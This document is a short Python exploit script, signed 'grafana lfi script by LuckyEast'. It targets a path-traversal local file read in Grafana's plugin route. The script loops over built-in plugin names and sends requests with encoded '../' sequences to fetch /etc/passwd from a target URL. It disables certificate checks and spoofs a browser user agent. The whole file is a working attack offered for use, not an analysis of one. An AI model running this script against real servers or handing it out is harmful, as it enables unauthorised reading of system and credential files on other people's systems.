import requests
import urllib3
import sys
import urllib.parse
urllib3.disable_warnings()
requests.packages.urllib3.disable_warnings()

plugins = [
'alertGroups',
'alertlist',
'alertmanager',
'annolist',
'barchart',
'bargauge',
'canvas',
'cloudwatch',
'dashboard',
'dashlist',
'debug',
'elasticsearch',
'gauge',
'geomap',
'gettingstarted',
'grafana-azure-monitor-datasource',
'grafana',
'graph',
'graphite',
'heatmap',
'histogram',
'influxdb',
'jaeger',
'live',
'logs',
'loki',
'mixed',
'mssql',
'mysql',
'news',
'nodeGraph',
'opentsdb',
'piechart',
'pluginlist',
'postgres',
'prometheus',
'stat',
'state-timeline',
'status-history',
'table-old',
'table',
'tempo',
'testdata',
'text',
'timeseries',
'welcome',
'xychart',
'zipkin',
]

headers = {
    'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0"
}

def exp(url):
    vul = 0
    for plugin in plugins:
        payload = url + '/public/plugins/' + plugin + '/%23/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc/passwd'
        rsp = requests.get(url=payload, headers=headers, allow_redirects=False, verify=False, timeout=10)
        print(rsp.status_code)
        if "root:x" in rsp.text and rsp.status_code == 200:
            print("[+] target is vul!!!")
            print("[+] payload: " + payload)
            vul = 1
            return
    if vul == 0:
        print("[-] target not found vul!!!")


if __name__ == "__main__":
    print('''
-------------------------------------
grafana lfi script by LuckyEast >_< 
-------------------------------------
''')
    url = sys.argv[1]
    if url[-1] == '/':
        url = url[:-1]
    exp(url)

